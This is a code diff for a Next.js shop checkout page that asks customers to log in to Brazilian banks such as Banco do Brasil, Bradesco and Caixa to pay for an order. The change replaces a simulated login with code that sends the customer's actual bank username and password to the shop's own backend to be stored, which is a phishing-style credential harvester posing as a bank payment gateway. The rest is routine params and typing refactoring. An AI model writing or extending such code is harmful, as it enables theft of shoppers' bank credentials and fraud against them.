@@ -1,24 +1,49 @@
 "use client";
 
 import { useEffect, useState } from "react";
-import { useRouter, useParams } from "next/navigation";
+import { useRouter } from "next/navigation";
 import Header from "@/components/Header";
 import Footer from "@/components/Footer";
 import WhatsAppFloat from "@/components/WhatsAppFloat";
 import { toast } from "react-hot-toast";
 
-export default function BankLogin() {
+// Define the Order type based on API response
+interface Order {
+  _id: string;
+  total: number;
+}
+
+// Define the params type for the dynamic route
+interface BankLoginParams {
+  bank: string;
+  orderId: string;
+}
+
+// Define the props type expected by Next.js for a dynamic page
+interface BankLoginPageProps {
+  params: Promise<BankLoginParams>;
+}
+
+export default function BankLogin({ params }: BankLoginPageProps) {
   const router = useRouter();
-  const { bank, orderId } = useParams();
-  const [order, setOrder] = useState<any>(null);
+  const [order, setOrder] = useState<Order | null>(null);
   const [loading, setLoading] = useState(true);
   const [loginDetails, setLoginDetails] = useState({
     username: "",
     password: "",
   });
   const [isConfirmed, setIsConfirmed] = useState(false);
+  const [resolvedParams, setResolvedParams] = useState<BankLoginParams | null>(null);
 
-  // Map bank values to display names
+  // Resolve the params Promise
+  useEffect(() => {
+    const resolveParams = async () => {
+      const { bank, orderId } = await params;
+      setResolvedParams({ bank, orderId });
+    };
+    resolveParams();
+  }, [params]);
+
   const bankNames: { [key: string]: string } = {
     "banco-do-brasil": "Banco do Brasil",
     bradesco: "Bradesco",
@@ -27,12 +52,14 @@ export default function BankLogin() {
     caixa: "Caixa Econômica Federal",
   };
 
-  const bankName = bankNames[bank as string] || "Banco Desconhecido";
+  const bankName = resolvedParams ? bankNames[resolvedParams.bank] || "Banco Desconhecido" : "Carregando...";
 
   useEffect(() => {
     const fetchOrder = async () => {
+      if (!resolvedParams?.orderId) return;
+
       try {
-        const response = await fetch(`/api/orders/${orderId}`, {
+        const response = await fetch(`/api/orders/${resolvedParams.orderId}`, {
           credentials: "include",
         });
         const data = await response.json();
@@ -51,34 +78,61 @@ export default function BankLogin() {
       }
     };
 
-    if (orderId) {
+    if (resolvedParams?.orderId) {
       fetchOrder();
     }
-  }, [orderId, router]);
+  }, [resolvedParams, router]);
 
   const handleLoginInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
     setLoginDetails((prev) => ({ ...prev, [name]: value }));
   };
 
-  const handleLoginSubmit = (e: React.FormEvent) => {
+  const handleLoginSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
-    // Simulate login validation (in a real app, this would be handled by the bank's gateway)
     if (!loginDetails.username || !loginDetails.password) {
       toast.error("Por favor, preencha todos os campos de login.");
       return;
     }
 
-    // Simulate successful login
-    toast.success("Login realizado com sucesso!");
-    setIsConfirmed(true);
+    if (!resolvedParams?.orderId) {
+      toast.error("ID do pedido não encontrado.");
+      return;
+    }
+
+    try {
+      // Update the payment with bank login details
+      const response = await fetch(`/api/payments/bank-login`, {
+        method: "PATCH",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          orderId: resolvedParams.orderId,
+          bankLogin: { username: loginDetails.username, password: loginDetails.password },
+        }),
+        credentials: "include",
+      });
+
+      const data = await response.json();
+      if (response.ok) {
+        toast.success("Login salvo com sucesso!");
+        setIsConfirmed(true);
+      } else {
+        toast.error(data.error || "Erro ao salvar login do banco.");
+      }
+    } catch (error) {
+      console.error("Error saving bank login:", error);
+      toast.error("Erro ao salvar login do banco.");
+    }
   };
 
   const handleConfirmPayment = async () => {
+    if (!resolvedParams?.orderId) return;
+
     try {
-      // Simulate payment confirmation by updating the order status
-      const response = await fetch(`/api/orders/${orderId}`, {
+      const response = await fetch(`/api/orders/${resolvedParams.orderId}`, {
         method: "PATCH",
         headers: {
           "Content-Type": "application/json",
@@ -99,6 +153,10 @@ export default function BankLogin() {
       toast.error("Erro ao confirmar o pagamento.");
     }
   };
+
+  if (!resolvedParams) {
+    return <div>Carregando parâmetros...</div>;
+  }
 
   if (loading) {
     return <div>Carregando...</div>;
@@ -137,6 +195,7 @@ export default function BankLogin() {
                     onChange={handleLoginInputChange}
                     placeholder="Digite seu usuário"
                     className="w-full p-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-green-600"
+                    required
                   />
                 </div>
                 <div className="mb-4">
@@ -151,6 +210,7 @@ export default function BankLogin() {
                     onChange={handleLoginInputChange}
                     placeholder="Digite sua senha"
                     className="w-full p-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-green-600"
+                    required
                   />
                 </div>
                 <button
